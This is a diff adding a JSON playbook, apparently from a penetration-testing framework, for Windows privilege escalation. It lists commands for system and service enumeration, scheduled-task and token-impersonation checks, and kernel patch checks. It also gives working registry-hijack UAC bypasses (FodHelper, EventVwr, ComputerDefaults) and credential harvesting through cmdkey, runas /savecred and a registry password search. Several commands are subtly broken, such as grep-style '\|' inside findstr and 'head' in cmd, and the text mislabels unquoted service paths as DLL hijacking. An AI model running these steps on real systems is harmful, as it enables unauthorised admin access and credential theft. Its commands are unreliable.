@@ -1,0 +1,475 @@
+{
+  "id": "windows_privilege_escalation",
+  "name": "Windows Privilege Escalation",
+  "description": "Escalate privileges on Windows systems from low-privileged user to SYSTEM/Administrator",
+  "category": "Privilege Escalation",
+  "subcategory": "Windows",
+  "version": "1.0",
+  "author": "Breakout Testing Framework",
+  "tags": ["windows", "privilege-escalation", "system", "administrator"],
+  "triggers": [
+    {
+      "id": "windows_user_access",
+      "name": "Windows User Access",
+      "description": "Trigger when user-level access on Windows system is available",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "os_family": "windows",
+          "access_level": "user"
+        }
+      }
+    },
+    {
+      "id": "privilege_escalation_unknown",
+      "name": "Privilege Escalation Possibility Unknown",
+      "description": "Trigger when privilege escalation possibility is unknown",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "privilege_escalation_possible": ""
+        }
+      }
+    }
+  ],
+  "procedures": [
+    {
+      "id": "system_enumeration",
+      "name": "System Information Enumeration",
+      "description": "Gather system information for privilege escalation assessment",
+      "order": 1,
+      "riskLevel": "low",
+      "steps": [
+        {
+          "id": "basic_system_info",
+          "name": "Basic System Information",
+          "description": "Collect fundamental system information",
+          "command": "systeminfo; hostname; whoami /all; net users; net localgroup administrators",
+          "expectedOutput": "System configuration, current user privileges, local users and groups",
+          "timeout": 60
+        },
+        {
+          "id": "check_patches",
+          "name": "Check Installed Patches",
+          "description": "Enumerate installed security patches",
+          "command": "wmic qfe list brief | findstr /v \"HotFixID\" | sort",
+          "expectedOutput": "List of installed Windows updates and patches",
+          "timeout": 45
+        },
+        {
+          "id": "check_privileges",
+          "name": "Check Current Privileges",
+          "description": "Examine current user privileges and group memberships",
+          "command": "whoami /priv; whoami /groups; net user %USERNAME%",
+          "expectedOutput": "User privileges, group memberships, and account details",
+          "timeout": 30
+        },
+        {
+          "id": "running_processes",
+          "name": "Running Processes",
+          "description": "List running processes and services",
+          "command": "tasklist /v; wmic process list brief; net start",
+          "expectedOutput": "Running processes, services, and process owners",
+          "timeout": 45
+        }
+      ]
+    },
+    {
+      "id": "service_enumeration",
+      "name": "Service Enumeration and Exploitation",
+      "description": "Identify and exploit vulnerable Windows services",
+      "order": 2,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "unquoted_service_paths",
+          "name": "Unquoted Service Paths",
+          "description": "Find services with unquoted paths vulnerable to DLL hijacking",
+          "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\"",
+          "expectedOutput": "Services with unquoted paths in non-Windows directories",
+          "timeout": 30
+        },
+        {
+          "id": "service_permissions",
+          "name": "Service Permissions Check",
+          "description": "Check service permissions for potential modification",
+          "command": "accesschk.exe -uwcqv \"Everyone\" * 2>nul | findstr /i service; accesschk.exe -uwcqv \"Authenticated Users\" * 2>nul | findstr /i service",
+          "expectedOutput": "Services with weak permissions",
+          "timeout": 60
+        },
+        {
+          "id": "service_binaries",
+          "name": "Service Binary Permissions",
+          "description": "Check permissions on service executable files",
+          "command": "for /f \"tokens=2 delims='='\" %a in ('wmic service get pathname /format:list ^| findstr /i pathname') do @echo %a & @icacls \"%a\" 2>nul | findstr /i \"(F)\\|(M)\\|(W)\"",
+          "expectedOutput": "Service binaries with write permissions",
+          "timeout": 90
+        },
+        {
+          "id": "service_registry_keys",
+          "name": "Service Registry Keys",
+          "description": "Check registry permissions for service configuration",
+          "command": "accesschk.exe -uwkqv \"Everyone\" HKLM\\System\\CurrentControlSet\\Services 2>nul | findstr /i \"RW\"",
+          "expectedOutput": "Service registry keys with write access",
+          "timeout": 60
+        }
+      ]
+    },
+    {
+      "id": "registry_exploitation",
+      "name": "Registry-based Privilege Escalation",
+      "description": "Exploit registry misconfigurations for privilege escalation",
+      "order": 3,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "always_install_elevated",
+          "name": "AlwaysInstallElevated Check",
+          "description": "Check for AlwaysInstallElevated policy vulnerability",
+          "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "expectedOutput": "AlwaysInstallElevated registry values",
+          "timeout": 30
+        },
+        {
+          "id": "autorun_entries",
+          "name": "Autorun Registry Entries",
+          "description": "Check autorun entries for potential hijacking",
+          "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          "expectedOutput": "Autorun registry entries and their permissions",
+          "timeout": 45
+        },
+        {
+          "id": "registry_permissions",
+          "name": "Registry Key Permissions",
+          "description": "Check for writable registry keys that could lead to privilege escalation",
+          "command": "accesschk.exe -uwkqv \"Everyone\" HKLM\\Software 2>nul | findstr /i \"RW\"; accesschk.exe -uwkqv \"Authenticated Users\" HKLM\\Software 2>nul | findstr /i \"RW\"",
+          "expectedOutput": "Registry keys with write permissions",
+          "timeout": 90
+        }
+      ]
+    },
+    {
+      "id": "scheduled_tasks_exploitation",
+      "name": "Scheduled Tasks Exploitation",
+      "description": "Identify and exploit vulnerable scheduled tasks",
+      "order": 4,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "list_scheduled_tasks",
+          "name": "List Scheduled Tasks",
+          "description": "Enumerate all scheduled tasks and their properties",
+          "command": "schtasks /query /fo LIST /v | findstr /i \"task\\|author\\|user\\|cmd\\|run\"",
+          "expectedOutput": "Scheduled tasks with execution details",
+          "timeout": 60
+        },
+        {
+          "id": "task_permissions",
+          "name": "Task File Permissions",
+          "description": "Check permissions on scheduled task executables",
+          "command": "for /f \"tokens=*\" %a in ('schtasks /query /fo list /v ^| findstr /i \"task to run\"') do @echo %a & @for /f \"tokens=3*\" %b in (\"%a\") do @icacls \"%b %c\" 2>nul | findstr /i \"(F)\\|(M)\\|(W)\"",
+          "expectedOutput": "Task executables with write permissions",
+          "timeout": 90
+        },
+        {
+          "id": "task_modification",
+          "name": "Task Modification Test",
+          "description": "Test ability to modify existing scheduled tasks",
+          "command": "schtasks /query /tn \"*\" /fo LIST | findstr /i \"Task Name\" | head -5",
+          "expectedOutput": "List of modifiable scheduled tasks",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "token_impersonation",
+      "name": "Token Impersonation Attacks",
+      "description": "Exploit SeImpersonate and SeAssignPrimaryToken privileges",
+      "order": 5,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_impersonate_privileges",
+          "name": "Check Impersonation Privileges",
+          "description": "Verify if SeImpersonate or SeAssignPrimaryToken privileges are available",
+          "command": "whoami /priv | findstr /i \"SeImpersonatePrivilege\\|SeAssignPrimaryTokenPrivilege\"",
+          "expectedOutput": "Impersonation privileges status",
+          "timeout": 15
+        },
+        {
+          "id": "juicy_potato_check",
+          "name": "JuicyPotato Compatibility Check",
+          "description": "Check system compatibility for JuicyPotato exploitation",
+          "command": "systeminfo | findstr /i \"OS Name\\|OS Version\"; echo %PROCESSOR_ARCHITECTURE%",
+          "expectedOutput": "System version and architecture for exploit compatibility",
+          "timeout": 30
+        },
+        {
+          "id": "rogue_potato_check",
+          "name": "RoguePotato Prerequisites",
+          "description": "Check for RoguePotato attack prerequisites",
+          "command": "netstat -an | findstr :135; whoami /groups | findstr /i \"SERVICE\"",
+          "expectedOutput": "RPC endpoint mapper and service context availability",
+          "timeout": 30
+        },
+        {
+          "id": "print_spoofer_check",
+          "name": "PrintSpoofer Compatibility",
+          "description": "Check for Print Spooler service and compatibility",
+          "command": "sc query spooler; reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler\" /v Start",
+          "expectedOutput": "Print Spooler service status and configuration",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "uac_bypass",
+      "name": "UAC Bypass Techniques",
+      "description": "Bypass User Account Control restrictions",
+      "order": 6,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "check_uac_level",
+          "name": "Check UAC Level",
+          "description": "Determine current UAC configuration",
+          "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin; reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
+          "expectedOutput": "UAC policy configuration",
+          "timeout": 30
+        },
+        {
+          "id": "fodhelper_bypass",
+          "name": "FodHelper UAC Bypass",
+          "description": "Test FodHelper-based UAC bypass technique",
+          "command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c echo UAC Bypass Test\" /f; reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
+          "expectedOutput": "Registry modification for FodHelper bypass",
+          "timeout": 30
+        },
+        {
+          "id": "eventvwr_bypass",
+          "name": "EventVwr UAC Bypass",
+          "description": "Test EventVwr-based UAC bypass technique",
+          "command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe /c echo EventVwr UAC Bypass Test\" /f",
+          "expectedOutput": "Registry modification for EventVwr bypass",
+          "timeout": 30
+        },
+        {
+          "id": "computerdefaults_bypass",
+          "name": "ComputerDefaults UAC Bypass",
+          "description": "Test ComputerDefaults UAC bypass technique",
+          "command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c echo ComputerDefaults UAC Bypass Test\" /f; reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
+          "expectedOutput": "Registry modification for ComputerDefaults bypass",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "credential_harvesting",
+      "name": "Credential Harvesting",
+      "description": "Extract stored credentials for privilege escalation",
+      "order": 7,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "stored_credentials",
+          "name": "Stored Credentials Check",
+          "description": "Look for stored credentials using cmdkey",
+          "command": "cmdkey /list; dir C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\; dir C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\",
+          "expectedOutput": "Stored credentials and credential files",
+          "timeout": 45
+        },
+        {
+          "id": "runas_stored_creds",
+          "name": "RunAs with Stored Credentials",
+          "description": "Test execution with stored credentials",
+          "command": "runas /savecred /user:administrator \"cmd.exe /c echo Stored credential test\"",
+          "expectedOutput": "Command execution with stored administrator credentials",
+          "timeout": 30
+        },
+        {
+          "id": "registry_passwords",
+          "name": "Registry Password Search",
+          "description": "Search registry for stored passwords",
+          "command": "reg query HKLM /f password /t REG_SZ /s | findstr /i password; reg query HKCU /f password /t REG_SZ /s | findstr /i password | head -10",
+          "expectedOutput": "Registry entries containing password strings",
+          "timeout": 120
+        },
+        {
+          "id": "unattend_files",
+          "name": "Unattend Files Search",
+          "description": "Search for unattended installation files with credentials",
+          "command": "dir C:\\*unattend*.xml /s /b 2>nul; dir C:\\Windows\\Panther\\*unattend*.xml /s /b 2>nul; dir C:\\Windows\\system32\\sysprep\\*unattend*.xml /s /b 2>nul",
+          "expectedOutput": "Unattended installation files that may contain credentials",
+          "timeout": 60
+        }
+      ]
+    },
+    {
+      "id": "kernel_exploits",
+      "name": "Kernel Exploitation",
+      "description": "Identify and exploit kernel vulnerabilities",
+      "order": 8,
+      "riskLevel": "critical",
+      "steps": [
+        {
+          "id": "kernel_version_check",
+          "name": "Kernel Version Check",
+          "description": "Identify Windows version and build for exploit selection",
+          "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"; wmic os get Caption,CSDVersion,OSArchitecture,Version",
+          "expectedOutput": "Detailed Windows version and architecture information",
+          "timeout": 30
+        },
+        {
+          "id": "ms16_032_check",
+          "name": "MS16-032 Vulnerability Check",
+          "description": "Check for MS16-032 (Secondary Logon) vulnerability",
+          "command": "systeminfo | findstr /i \"KB3143141\\|KB3147458\" && echo \"Patched against MS16-032\" || echo \"Potentially vulnerable to MS16-032\"",
+          "expectedOutput": "MS16-032 patch status",
+          "timeout": 30
+        },
+        {
+          "id": "ms16_135_check",
+          "name": "MS16-135 Vulnerability Check",
+          "description": "Check for MS16-135 (Win32k) vulnerability",
+          "command": "systeminfo | findstr /i \"KB3199135\" && echo \"Patched against MS16-135\" || echo \"Potentially vulnerable to MS16-135\"",
+          "expectedOutput": "MS16-135 patch status",
+          "timeout": 30
+        },
+        {
+          "id": "print_nightmare_check",
+          "name": "PrintNightmare Vulnerability Check",
+          "description": "Check for PrintNightmare vulnerability (CVE-2021-1675/CVE-2021-34527)",
+          "command": "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\" /v RestrictDriverInstallationToAdministrators 2>nul; sc query spooler",
+          "expectedOutput": "Print Spooler configuration and PrintNightmare mitigation status",
+          "timeout": 30
+        }
+      ]
+    }
+  ],
+  "risks": [
+    {
+      "risk": "Service exploitation may disrupt critical system services",
+      "mitigation": "Test service modifications carefully and maintain service backups"
+    },
+    {
+      "risk": "Registry modifications may affect system stability",
+      "mitigation": "Document all registry changes for cleanup and restoration"
+    },
+    {
+      "risk": "UAC bypass attempts may trigger security monitoring",
+      "mitigation": "Perform UAC bypass testing gradually with monitoring awareness"
+    },
+    {
+      "risk": "Kernel exploits may cause system crashes or instability",
+      "mitigation": "Test kernel exploits only with explicit approval and system backups"
+    },
+    {
+      "risk": "Token impersonation may alert advanced security products",
+      "mitigation": "Use token impersonation techniques cautiously in monitored environments"
+    },
+    {
+      "risk": "Credential harvesting may expose sensitive information",
+      "mitigation": "Handle discovered credentials according to security protocols"
+    }
+  ],
+  "tools": [
+    {
+      "name": "PowerShell",
+      "version": "5.0+",
+      "required": true,
+      "purpose": "System enumeration and exploitation"
+    },
+    {
+      "name": "AccessChk",
+      "version": "6.0+",
+      "required": false,
+      "purpose": "Permission enumeration"
+    },
+    {
+      "name": "WinPEAS",
+      "version": "Latest",
+      "required": false,
+      "purpose": "Automated privilege escalation enumeration"
+    },
+    {
+      "name": "JuicyPotato/RoguePotato",
+      "version": "Latest",
+      "required": false,
+      "purpose": "Token impersonation exploitation"
+    },
+    {
+      "name": "PrintSpoofer",
+      "version": "Latest",
+      "required": false,
+      "purpose": "Print Spooler token impersonation"
+    }
+  ],
+  "equipment": [
+    {
+      "name": "Windows System Access",
+      "required": true,
+      "description": "User-level access to Windows system"
+    },
+    {
+      "name": "Command Line Access",
+      "required": true,
+      "description": "CMD or PowerShell access for enumeration and exploitation"
+    }
+  ],
+  "suggestedFindings": [
+    {
+      "title": "System Information Gathered",
+      "description": "Successfully enumerated system configuration and user privileges",
+      "severity": "informational",
+      "evidence": "System info output, user privileges, installed patches"
+    },
+    {
+      "title": "Vulnerable Windows Services",
+      "description": "Identified services with weak permissions or unquoted paths",
+      "severity": "high",
+      "evidence": "Service enumeration, permission checks, exploitation paths"
+    },
+    {
+      "title": "Registry Privilege Escalation",
+      "description": "Found registry misconfigurations enabling privilege escalation",
+      "severity": "high",
+      "evidence": "AlwaysInstallElevated settings, writable registry keys, autorun entries"
+    },
+    {
+      "title": "Scheduled Task Vulnerabilities",
+      "description": "Identified vulnerable scheduled tasks with weak permissions",
+      "severity": "medium",
+      "evidence": "Task enumeration, file permissions, modification capabilities"
+    },
+    {
+      "title": "Token Impersonation Possible",
+      "description": "SeImpersonate or SeAssignPrimaryToken privileges available for exploitation",
+      "severity": "critical",
+      "evidence": "Privilege enumeration, service context, exploitation tools compatibility"
+    },
+    {
+      "title": "UAC Bypass Successful",
+      "description": "Successfully bypassed User Account Control restrictions",
+      "severity": "high",
+      "evidence": "UAC configuration, bypass techniques, elevated command execution"
+    },
+    {
+      "title": "Stored Credentials Discovered",
+      "description": "Found stored credentials that can be used for privilege escalation",
+      "severity": "high",
+      "evidence": "Credential files, registry passwords, unattended installation files"
+    },
+    {
+      "title": "Kernel Vulnerability Exposure",
+      "description": "System vulnerable to known kernel exploits for privilege escalation",
+      "severity": "critical",
+      "evidence": "Kernel version, missing patches, exploit compatibility"
+    },
+    {
+      "title": "Administrator Access Achieved",
+      "description": "Successfully escalated privileges to Administrator or SYSTEM level",
+      "severity": "critical",
+      "evidence": "Elevated command execution, administrative group membership, system access"
+    }
+  ]
+}
